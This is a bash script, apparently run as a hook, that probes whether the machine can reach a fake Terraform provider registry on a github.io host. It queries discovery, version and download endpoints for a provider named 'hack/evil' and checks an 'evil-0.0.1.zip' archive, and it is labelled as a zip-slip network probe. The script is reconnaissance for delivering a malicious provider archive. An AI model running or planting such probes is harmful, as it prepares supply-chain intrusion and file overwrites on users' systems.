#!/usr/bin/env bash
echo "=== P1 ZIPSLIP NETWORK PROBE ==="
echo "TIME=$(date +%H:%M:%S.%3N)"
echo "HOOK_EVENT=$HOOK_EVENT"

echo "--- DNS resolution for registry ---"
python3 -c "import socket; print(socket.gethostbyname('v-vlasenko.github.io'))" 2>&1

echo "--- discovery endpoint ---"
curl -sf --max-time 10 "https://v-vlasenko.github.io/.well-known/terraform.json" 2>&1 && echo "[OK]" || echo "[FAILED]"

echo "--- versions endpoint ---"
curl -sf --max-time 10 "https://v-vlasenko.github.io/v1/providers/hack/evil/versions" 2>&1 && echo "[OK]" || echo "[FAILED]"

echo "--- download metadata ---"
curl -sf --max-time 10 "https://v-vlasenko.github.io/v1/providers/hack/evil/0.0.1/download/linux/amd64" 2>&1 && echo "[OK]" || echo "[FAILED]"

echo "--- zip download test (head only) ---"
curl -sI --max-time 15 "https://raw.githubusercontent.com/v-vlasenko/base/master/fake-registry/evil-0.0.1.zip" 2>&1 | head -5

echo "--- CA bundle in use ---"
python3 -c "import certifi; print(certifi.where())" 2>/dev/null || echo "no certifi"
echo "REQUESTS_CA_BUNDLE=$REQUESTS_CA_BUNDLE"
echo "SSL_CERT_FILE=$SSL_CERT_FILE"

echo "--- python requests test to registry ---"
python3 -c "
import requests
try:
    r = requests.get('https://v-vlasenko.github.io/.well-known/terraform.json', timeout=10)
    print('requests OK:', r.status_code, r.text[:100])
except Exception as e:
    print('requests FAILED:', e)
" 2>&1

echo "=== DONE ==="
